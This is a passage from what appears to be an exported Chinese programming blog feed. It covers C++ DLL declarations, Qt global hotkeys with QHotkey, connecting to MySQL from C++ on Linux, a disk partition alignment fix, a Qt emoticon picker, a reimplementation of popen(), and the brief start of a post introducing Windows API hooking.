<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//	动态</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">( _stdcall *pGetMaxN)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>; <span class="comment">//定义一个函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">( _stdcall *pShowMsg)</span><span class="params">(<span class="keyword">char</span> *, <span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="comment">//	静态</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllimport) <span class="function"><span class="keyword">int</span> _stdcall <span class="title">GetMaxNumber</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllimport) <span class="function"><span class="keyword">void</span> _stdcall <span class="title">ShowMsg</span><span class="params">(<span class="keyword">char</span> *, <span class="keyword">char</span>*)</span></span>;</span><br></pre></td></tr></table></figure>

<p>Bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt注册热键QHotkey</title>
    <url>/qt-reg-hotkey/</url>
    <content><![CDATA[<p>要想在Qt支持全局注册热键，Windows下方法很简单RegisterHotKey函数可以满足。当然，这只能在Windows下操作，那么，是否有一个跨平台的全局注册热键库方便使用呢？</p>
<a id="more"></a>

<h3 id="QHotkey"><a href="#QHotkey" class="headerlink" title="QHotkey"></a>QHotkey</h3><p><a href="https://www.qpm.io/packages/de.skycoder42.qhotkey/index.html" target="_blank" rel="noopener">官网</a></p>
<p><a href="https://github.com/Skycoder42/QHotkey" target="_blank" rel="noopener">Github</a></p>
<p><a href="https://skycoder42.github.io/QHotkey/class_q_hotkey.html" target="_blank" rel="noopener">QHotkey类参考</a></p>
<p><strong>PS: QHotkey适用于 Windows, Mac ， X11</strong></p>
<p>从github上获取源文件，自行编译(无需安装)</p>
<blockquote>
<p>git clone <a href="https://github.com/Skycoder42/QHotkey.git" target="_blank" rel="noopener">https://github.com/Skycoder42/QHotkey.git</a><br>cd QHotkey<br>qmake<br>make</p>
</blockquote>
<p>之后就可以使用了。使用方法如下<br>创建一个Qt项目，在 .pro 中添加</p>
<p>include(QHotkey/qhotkey.pri)<br>LIBS += -L$$PWD/QHotkey/QHotkey -lQHotkey<br>INCLUDEPATH += $$PWD/QHotkey/QHotkey</p>
<p>注意，我把 QHotkey 文件夹复制到项目目录下，并且要include <strong>qhotkey.pri</strong><br>LIBS 和 INCLUDEPATH不能直接写成，否则出现 <strong>No such file or directory</strong>：<br>LIBS += -LQHotkey/QHotkey -lQHotkey<br>INCLUDEPATH += QHotkey/QHotkey</p>
<p>主要代码实例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"QHotkey"</span></span></span><br><span class="line"><span class="keyword">bool</span> ispressed=<span class="literal">false</span>;</span><br><span class="line">Widget::Widget(QWidget *parent) :</span><br><span class="line">    QWidget(parent),</span><br><span class="line">    ui(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">// 过滤警告</span></span><br><span class="line">    QLoggingCategory::setFilterRules(QStringLiteral(<span class="string">"QHotkey.warning=false"</span>));</span><br><span class="line">	<span class="comment">// Ctrl+P 之间不能有空格</span></span><br><span class="line">    QHotkey *hotkey = <span class="keyword">new</span> QHotkey&#123;QKeySequence(<span class="string">"Ctrl+P"</span>),<span class="literal">true</span>&#125;; </span><br><span class="line">    <span class="built_in">connect</span>(hotkey, &amp;QHotkey::activated, [<span class="keyword">this</span>]()&#123;</span><br><span class="line">        <span class="comment">//这里进行判断,只允许按下一次</span></span><br><span class="line">        <span class="keyword">if</span>(ispressed==<span class="literal">false</span>)&#123;</span><br><span class="line">            ispressed=<span class="literal">true</span>;</span><br><span class="line">            QMessageBox::information(<span class="keyword">this</span>,<span class="string">"Hello"</span>,<span class="string">"Hello"</span>);</span><br><span class="line">            ispressed=<span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            ispressed=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认的，QHotkey会打印一些警告信息，不过可以用 <strong>QLoggingCategory::setFilterRules</strong> 过滤掉这些信息。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QHotkey (QObject *parent=Q_NULLPTR)</span><br><span class="line">QHotkey (<span class="keyword">const</span> QKeySequence &amp;shortcut, <span class="keyword">bool</span> autoRegister=<span class="literal">false</span>, QObject *parent=Q_NULLPTR)</span><br><span class="line">QHotkey (Qt::Key key, Qt::KeyboardModifiers modifiers, <span class="keyword">bool</span> autoRegister=<span class="literal">false</span>, QObject *parent=Q_NULLPTR)</span><br><span class="line">QHotkey (<span class="keyword">const</span> NativeShortcut &amp;shortcut, <span class="keyword">bool</span> autoRegister=<span class="literal">false</span>, QObject *parent=Q_NULLPTR)</span><br><span class="line"><span class="function"><span class="keyword">bool</span> 	<span class="title">setRegistered</span> <span class="params">(<span class="keyword">bool</span> registered)</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> 	<span class="title">setShortcut</span> <span class="params">(<span class="keyword">const</span> QKeySequence &amp;shortcut, <span class="keyword">bool</span> autoRegister=<span class="literal">false</span>)</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> 	<span class="title">setShortcut</span> <span class="params">(Qt::Key key, Qt::KeyboardModifiers modifiers, <span class="keyword">bool</span> autoRegister=<span class="literal">false</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>有两种方法构造一个 QHotkey 对象：</p>
<p>1.提供一个 <strong>QKeySequence</strong> 对象，如果 QHotkey 构造函数第二个参数为 <strong>false</strong>，则必须调用 <strong>bool setRegistered (bool registered)</strong> 注册热键</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QHotkey *hotkey = new QHotkey&#123;QKeySequence(&quot;Ctrl+P&quot;),true&#125;;</span><br></pre></td></tr></table></figure>

<p>2.提供<strong>Qt::Key和Qt::KeyboardModifiers</strong>，不过是通过<strong>setShortcut</strong>设置。如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QHotkey *hotkey =new QHotkey(this);hotkey-&gt;setShortcut(Qt::Key_A,Qt::ControlModifier,true);</span><br></pre></td></tr></table></figure>

<p>注册热键成功后就可以在槽函数<strong>QHotkey::activated</strong>中进行处理了</p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>是不是很简单呢？</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下C++连接Mysql</title>
    <url>/linux-cpp-connect-mysql/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在连接MySQL之前，确保系统安装了MySQL，并且安装了对应的库文件。可以到官网下载不同版本的MySQL（自行编译安装）<a href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener">传送门&gt;&gt;</a>具体安装方法不再多说</p>
<a id="more"></a>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mysql/mysql.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">connMYSQL</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//mysql_server_init(NULL,NULL,NULL);</span></span><br><span class="line">    MYSQL mysql;</span><br><span class="line">    mysql_init(&amp;mysql);</span><br><span class="line">    <span class="comment">//设置字符集 方法1</span></span><br><span class="line">    <span class="keyword">int</span> r=mysql_options(&amp;mysql,MYSQL_SET_CHARSET_NAME,<span class="string">"utf8"</span>);</span><br><span class="line">    <span class="keyword">if</span>(r==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"设置字符集 utf8 ok\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//连接mysql</span></span><br><span class="line">    MYSQL *m= mysql_real_connect(&amp;mysql, <span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>,<span class="string">"db_0"</span>, <span class="number">3306</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!m)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> errorCode=mysql_errno(&amp;mysql);</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *errorString=mysql_error(&amp;mysql);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"连接数据库失败 : %s\n"</span>,errorString);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置字符集 方法2</span></span><br><span class="line">    mysql_query(&amp;mysql,<span class="string">"set names 'utf8';"</span>);</span><br><span class="line">    mysql_query(&amp;mysql,<span class="string">"select *from tb_0;"</span>);</span><br><span class="line">    <span class="comment">//获取资源结果集</span></span><br><span class="line">    MYSQL_RES *result=mysql_store_result(&amp;mysql);</span><br><span class="line">    <span class="comment">//返回查询受影响的行</span></span><br><span class="line">    <span class="keyword">int</span> affectedRows=mysql_affected_rows(&amp;mysql);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"affected rows: %d \n"</span>,affectedRows);</span><br><span class="line">    <span class="comment">//获取记录数</span></span><br><span class="line">    <span class="keyword">int</span> rowcount=mysql_num_rows(result);</span><br><span class="line">    <span class="comment">//获取字段数</span></span><br><span class="line">    <span class="keyword">int</span> fieldcount=mysql_num_fields(result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"rowCount:%d fieldCount:%d \n"</span>,rowcount,fieldcount);</span><br><span class="line">    MYSQL_FIELD *field=<span class="literal">NULL</span>;</span><br><span class="line">     <span class="comment">//遍历字段</span></span><br><span class="line">    <span class="keyword">while</span> (field=mysql_fetch_field(result))&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">"--&gt;"</span>&lt;&lt;field-&gt;name&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//field= mysql_fetch_field_direct(result,0);</span></span><br><span class="line">    <span class="comment">//field= mysql_fetch_field_direct(result,1);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"——————————————————————————————\n"</span>);</span><br><span class="line">    <span class="comment">//char ** = MYSQL_ROW</span></span><br><span class="line">    MYSQL_ROW row=<span class="literal">NULL</span>;</span><br><span class="line">     <span class="comment">//遍历行</span></span><br><span class="line">    <span class="keyword">while</span>(row=mysql_fetch_row(result))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\t%s\t%s\t%s\t%s\n"</span>,row[<span class="number">0</span>],row[<span class="number">1</span>],row[<span class="number">2</span>],row[<span class="number">3</span>],row[<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"——————————————————————————————\n"</span>);</span><br><span class="line">    <span class="comment">//释放结果集</span></span><br><span class="line">    mysql_free_result(result);</span><br><span class="line">    <span class="comment">//关闭连接</span></span><br><span class="line">    mysql_close(&amp;mysql);</span><br><span class="line">    <span class="comment">//mysql_server_end();</span></span><br><span class="line">    <span class="comment">//mysql_library_end();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      connMYSQL();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于我使用的是CLion，所以当我写出来的源文件是无法直接编译的，这时候可以在<br><strong><font color="red">CMakeLists.txt</font> *<em>内添加 *</em>target_link_libraries(mysqlconn /usr/lib/libmysqlclient.so)</strong><br>其中 mysqlconn 为项目名，/usr/lib/libmysqlclient.so 为库文件路径<br>如 /usr/lib/ 不存在 libmysqlclient.so 文件，那么可以用</p>
<blockquote>
<p>locate libmysqlclient</p>
</blockquote>
<p>找到系统内存在的 libmysqlclient库文件。<br>比如我的本来是 /usr/lib/x86_64-linux-gnu/libmysqlclient.so ，那么我就可以设置个软链接</p>
<blockquote>
<p>ln -s /usr/lib/x86_64-linux-gnu/libmysqlclient.so /usr/lib/libmysqlclient.so</p>
</blockquote>
<p>或者简单点也可以直接</p>
<blockquote>
<p>g++ main.cpp -o test -lmysqlclient<br>./test</p>
</blockquote>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Partition X does not start on physical sector boundary</title>
    <url>/linux-partition-x/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天好好的，突然来了这个，还以为我原来分的扩展分区不能用了。所以赶紧百度，百度不行Google，果然，还是Googl牛！然而英文，只好硬着头皮去看。。。</p>
<blockquote>
<p>原文: <a href="https://askubuntu.com/questions/156994/partition-does-not-start-on-physical-sector-boundary" target="_blank" rel="noopener">https://askubuntu.com/questions/156994/partition-does-not-start-on-physical-sector-boundary</a></p>
</blockquote>
<a id="more"></a>

<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>错误情况图<img src="/uploads/images/files/0.png" alt="img"></p>
<p>红色那个错误提示：<code>Partition 3 does not start on physical sector boundary.</code><br>我第一次是把那个 /dev/sda5 删除在新建格式化，结果还是不行，最后我看到老外用 <strong>gparted</strong></p>
<ul>
<li><p>我把以前的拓展分区全部删除，结果如图【未分配】<br><img src="/uploads/images/files/1.png" alt="img"></p>
</li>
<li><p>新建<code>扩展分区</code>，<code>之前的空余空间</code>为 <code>1MB</code><br><img src="/uploads/images/files/2.png" alt="img"></p>
</li>
<li><p>然后在新建的扩展分区那新建一个<code>逻辑分区</code>，同样也是<code>1MB</code><br><img src="/uploads/images/files/3.png" alt="img"></p>
</li>
<li><p>全部应用，完成<br><img src="/uploads/images/files/4.png" alt="img"></p>
</li>
<li><p>这时在终端下输入 <code>fdisk -l</code>应该可以看到 没有错误了</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>用Qt实现类似QQ表情窗口</title>
    <url>/linux-qt-qqwindow/</url>
    <content><![CDATA[<p>演示</p>
<p><img src="/uploads/images/files/demo1.gif" alt></p>
<a id="more"></a>

<p>实现起来比较简单,就是在每个<strong>TableWidget</strong>的单元格设置一个Widget,如Label.重写QLabel类中的两个函数,达到鼠标进入离开单元格时显示的效果</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加gif到TabWidget</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::addGIFtoTableWidget</span><span class="params">(<span class="keyword">int</span> row,<span class="keyword">int</span> column,QString file)</span></span>&#123;</span><br><span class="line">     <span class="comment">//自定义类,用来重新实现了一些函数</span></span><br><span class="line">    MyLabel *label=<span class="keyword">new</span> MyLabel;</span><br><span class="line">    <span class="comment">//设置边距</span></span><br><span class="line">    label-&gt;setMargin(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//gif动画</span></span><br><span class="line">    QMovie *movie=<span class="keyword">new</span> QMovie;</span><br><span class="line">	</span><br><span class="line">    movie-&gt;setFileName(file);</span><br><span class="line">    movie-&gt;setScaledSize(QSize(<span class="number">24</span>,<span class="number">24</span>));</span><br><span class="line">    movie-&gt;start();</span><br><span class="line">    movie-&gt;<span class="built_in">stop</span>();</span><br><span class="line">    label-&gt;setMovie(movie);</span><br><span class="line">     <span class="comment">//添加部件到tableWidget</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setCellWidget(row,column,label);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QQ_GIF_DIR <span class="meta-string">"../expression/qq/"</span></span></span><br><span class="line">Widget::Widget(QWidget *parent) :</span><br><span class="line">    QWidget(parent),</span><br><span class="line">    ui(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//不可选</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setSelectionMode(QTableWidget::NoSelection);</span><br><span class="line">    ui-&gt;tableWidget-&gt;setRowCount(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">//初始化 gif表格</span></span><br><span class="line">    <span class="keyword">int</span> num_index=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rowCount= ui-&gt;tableWidget-&gt;rowCount();</span><br><span class="line">    <span class="keyword">int</span> columnCount = ui-&gt;tableWidget-&gt;columnCount();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> row = <span class="number">0</span>; row &lt;rowCount; ++row)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> column = <span class="number">0</span>;column&lt;columnCount; ++column)</span><br><span class="line">         &#123;</span><br><span class="line">            QString strFileName=QString(<span class="string">"%1%2.gif"</span>).arg(QQ_GIF_DIR).arg(num_index);</span><br><span class="line">              <span class="comment">//gif文件是否存在</span></span><br><span class="line">            <span class="keyword">if</span>(QFileInfo(strFileName).<span class="built_in">exists</span>())</span><br><span class="line">                addGIFtoTableWidget(row,column,strFileName);</span><br><span class="line">            num_index++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再看看 MyLabel 类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mylabel.h</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYLABEL_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYLABEL_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QLabel&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLabel</span> :</span> <span class="keyword">public</span> QLabel</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyLabel(QWidget *parent=<span class="number">0</span>);</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">enterEvent</span><span class="params">(QEvent *event)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">leaveEvent</span><span class="params">(QEvent *event)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYLABEL_H</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mylabel.cpp</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mylabel.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QMovie&gt;</span></span></span><br><span class="line">MyLabel::MyLabel(QWidget *parent):QLabel(parent)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyLabel::enterEvent</span><span class="params">(QEvent *event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setStyleSheet(<span class="string">"border: 1px solid rgb(111, 156, 207);background-color:rgba(150,150,150,50)"</span>);</span><br><span class="line">    <span class="built_in">setCursor</span>(Qt::PointingHandCursor);</span><br><span class="line">    QMovie *movie=<span class="keyword">this</span>-&gt;movie();</span><br><span class="line">    <span class="comment">//开始播放</span></span><br><span class="line">    movie-&gt;start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyLabel::leaveEvent</span><span class="params">(QEvent *event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setStyleSheet(<span class="string">"border:none"</span>);</span><br><span class="line">    <span class="built_in">setCursor</span>(Qt::ArrowCursor);</span><br><span class="line">    QMovie *movie=<span class="keyword">this</span>-&gt;movie();</span><br><span class="line">    <span class="comment">//跳转到动态图的初始帧</span></span><br><span class="line">    movie-&gt;jumpToFrame(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//停止</span></span><br><span class="line">    movie-&gt;<span class="built_in">stop</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我在Ui窗口添加了了一个table widget部件,所以还要先设置相应的参数<br><img src="/uploads/images/files/demo2.png" alt="img"></p>
<p>OK,的确挺简单的…当然还有很多问题也要考虑…</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux popen()函数内部实现原理</title>
    <url>/linux-popen/</url>
    <content><![CDATA[<p>最近发现了一个函数 <strong>popen()/pclose()</strong> ,所以现在打算理清下思路…</p>
<a id="more"></a>

<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p>linux下的 <strong>popen</strong> 函数,大概就是通过 <strong>fork</strong> 一个子进程来执行命令并返回执行的结果给父进程.</p>
<blockquote>
<p>The popen() function shall <strong>execute the command</strong> specified by the string command. It shall <strong>create a pipe</strong> between the calling program and the executed command, and shall return a pointer to a stream that can be used to either read from or write to the pipe.</p>
<p><a href="http://pubs.opengroup.org/onlinepubs/009695399/functions/popen.html" target="_blank" rel="noopener">http://pubs.opengroup.org/onlinepubs/009695399/functions/popen.html</a></p>
</blockquote>
<p>函数声明如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Create a new stream connected to a pipe running the given command.</span></span><br><span class="line"><span class="comment">   This function is a possible cancellation point and therefore not</span></span><br><span class="line"><span class="comment">   marked with __THROW.  */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> FILE *<span class="title">popen</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__command, <span class="keyword">const</span> <span class="keyword">char</span> *__modes)</span> __wur</span>;</span><br><span class="line"><span class="comment">/* Close a stream opened by popen and return the status of its child.</span></span><br><span class="line"><span class="comment">   This function is a possible cancellation point and therefore not</span></span><br><span class="line"><span class="comment">   marked with __THROW.  */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">pclose</span> <span class="params">(FILE *__stream)</span></span>;</span><br></pre></td></tr></table></figure>

<p>当然了,更重要的是要知道该函数内部是怎么实现的,大概步骤如下:<strong>(此处仅讨论子进程返回结果给父进程!)</strong></p>
<ol>
<li>父进程通过 <strong>pipe()</strong> 创建 <strong>读/写匿名管道</strong> ,并关闭写管道pfd[1]</li>
<li>然后 <strong>fork()</strong> 创建子进程</li>
<li>子进程 <strong>close()</strong> 读管道pfd[0]和标准输出(STDOUT_FILENO=1) ,并 <strong>dup()</strong> 写管道pfd[1]</li>
<li>子进程通过 <strong>execl()</strong> 执行命令,执行的结果为标准输出重定向到了写管道pfd[1]</li>
<li>父进程 <strong>wait()</strong> 子进程退出,接着 <strong>fdopen()</strong> 通过文件描述符返回一个 <strong>FILE*</strong> . 注意返回文件指针时,不能关闭读管道pfd[0],可以通过后续 fclose() 关闭该描述符</li>
<li><strong>fclose()</strong> 关闭该读管道pfd[0]</li>
</ol>
<p>简单实现代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE* <span class="title">mypopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*cmd)</span></span>&#123;</span><br><span class="line">    <span class="comment">//管道文件描述符</span></span><br><span class="line">    <span class="keyword">int</span> pfd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span>(pipe(pfd)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error: %s\n"</span>,strerror(errno));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建子进程</span></span><br><span class="line">    <span class="keyword">pid_t</span>  pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">close</span>(pfd[<span class="number">0</span>]);</span><br><span class="line">        </span><br><span class="line">         <span class="comment">//重定向 标准输出 到 写管道</span></span><br><span class="line">        <span class="built_in">close</span>(STDOUT_FILENO);</span><br><span class="line">        dup(pfd[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">char</span> _cmd[<span class="number">50</span>]&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">sprintf</span>(_cmd,<span class="string">"%s"</span>,cmd);</span><br><span class="line">        execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,<span class="string">"-c"</span>,_cmd,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭写管道</span></span><br><span class="line">    <span class="built_in">close</span>(pfd[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//等待子进程退出</span></span><br><span class="line">    <span class="keyword">int</span> p= wait(<span class="number">0</span>);</span><br><span class="line">   <span class="comment">//printf("%d terminal\n",p);</span></span><br><span class="line">    <span class="comment">//直接读取数据</span></span><br><span class="line">    <span class="comment">//char buffer[1024*2]=&#123;0&#125;;</span></span><br><span class="line">    <span class="comment">//read(pfd[0],buffer,1024*2);</span></span><br><span class="line">    FILE* pfile =fdopen(pfd[<span class="number">0</span>],<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!pfile) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> pfile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE *file= mypopen(<span class="string">"ls -lSah"</span>);</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(fgets(<span class="built_in">buffer</span>,<span class="number">1024</span>,file))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,<span class="built_in">buffer</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//close pfd[0]!</span></span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中,较重要的是在子进程中重定向标准输出,这里给出其他方法重定向标准输出到管道描述符</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法1</span></span><br><span class="line"><span class="comment">//重定向 标准输出 到 写管道</span></span><br><span class="line"><span class="built_in">close</span>(STDOUT_FILENO);</span><br><span class="line">dup(pfd[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//方法2,相当于先close(STDOUT_FILENO) ,再dup(pfd[1])</span></span><br><span class="line">dup2(pfd[<span class="number">1</span>],STDOUT_FILENO);</span><br><span class="line"><span class="comment">//方法3</span></span><br><span class="line"><span class="built_in">close</span>(STDOUT_FILENO);</span><br><span class="line"><span class="keyword">int</span> fd=fcntl(pfd[<span class="number">1</span>],F_DUPFD);</span><br></pre></td></tr></table></figure>

<h4 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h4><p>参考文章: <a href="http://blog.csdn.net/litingli/article/details/5891726" target="_blank" rel="noopener">http://blog.csdn.net/litingli/article/details/5891726</a></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows API HOOK钩子</title>
    <url>/windows-hook/</url>
    <content><![CDATA[<p>本文讲下Windows API HOOK(钩子),主要和DLL注入联系在一起.<br>Windows系统把每个WindowsAPI函数功能封装到了每一个DLL库文件中,从而提高程序的编译运行效率,而在应用程序运行期间动态库时,必然存在程序获取DLL中的函数地址.于是通过注入DLL来截取信息.</p>
<a id="more"></a>

<h3 id="消息HOOK"><a href="#消息HOOK" class="headerlink" title="消息HOOK"></a>消息HOOK</h3><p>HOOK(挂钩)技术,可分为 <strong>内核层(R0)HOOK</strong> , <strong>应用层(R3)HOOK</strong> ,这两种技术实现起来虽然略相似,但是 <strong>内核层HOOK</strong> 比起 <strong>应用层HOOK</strong> 难度要高得多,而且编写的代码也要保证正确(异常机制),不然万一来个赋值给一个空指针的代码,蓝屏就呵呵了…本文主要讲解 应用层hook</p>
